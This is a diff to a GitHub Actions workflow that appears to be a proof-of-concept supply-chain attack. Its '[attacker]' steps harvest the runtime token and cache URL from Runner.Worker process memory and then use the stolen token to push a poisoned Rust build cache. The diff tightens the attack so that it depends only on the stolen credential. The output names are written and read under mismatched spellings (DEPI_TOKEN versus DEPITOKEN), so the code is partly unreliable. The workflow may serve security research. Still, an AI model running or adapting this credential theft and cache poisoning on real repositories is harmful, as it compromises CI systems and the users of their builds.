@@ -99,7 +99,12 @@ jobs:
             { echo 'DEPI_TOKEN<<EOF'; sed -n 's/^DEPI_TOKEN=//p' /tmp/harvest.out; echo 'EOF'; } >> "$GITHUB_OUTPUT"
             echo "stolen runtime token reassembled ($(sed -n 's/^DEPI_TOKEN=//p' /tmp/harvest.out | wc -c) chars)"
           else
-            echo "::warning::stage-1 harvest failed; stage 2 will fall back to its own runtime token"
+            echo "::error::stage-1 harvest failed — no stolen token, no poison (the runtime token is not in step env on current runner images; the memory read is the only source)"
+            exit 1
+          fi
+          if grep -q '^DEPI_CACHE_URL=' /tmp/harvest.out; then
+            { echo 'DEPI_CACHE_URL<<EOF'; sed -n 's/^DEPI_CACHE_URL=//p' /tmp/harvest.out; echo 'EOF'; } >> "$GITHUB_OUTPUT"
+            echo "cache service URL recovered from Runner.Worker memory"
           fi
 
       - name: "[attacker] compute rust-ci cache key + build poisoned tar"
@@ -146,10 +151,11 @@ jobs:
         if: ${{ inputs.variant != 'clean' }}
         env:
           STOLEN_TOKEN: ${{ steps.harvest.outputs.DEPITOKEN }}
+          STOLEN_CACHE_URL: ${{ steps.harvest.outputs.DEPICACHEURL }}
         run: |
           set -euo pipefail
-          TOKEN="${STOLEN_TOKEN:-${ACTIONS_RUNTIME_TOKEN:-}}"
-          CACHE_URL="${ACTIONS_CACHE_URL:-${ACTIONS_RESULTS_URL:-}}"
+          TOKEN="${STOLEN_TOKEN}"
+          CACHE_URL="${STOLEN_CACHE_URL:-${ACTIONS_CACHE_URL:-${ACTIONS_RESULTS_URL:-}}}"
           if [ -z "$TOKEN" ] || [ -z "$CACHE_URL" ]; then
             echo "no stolen token or cache URL available:"
             echo "  token: ${TOKEN:+present}${TOKEN:-MISSING}  cache url: ${CACHE_URL:-MISSING}"
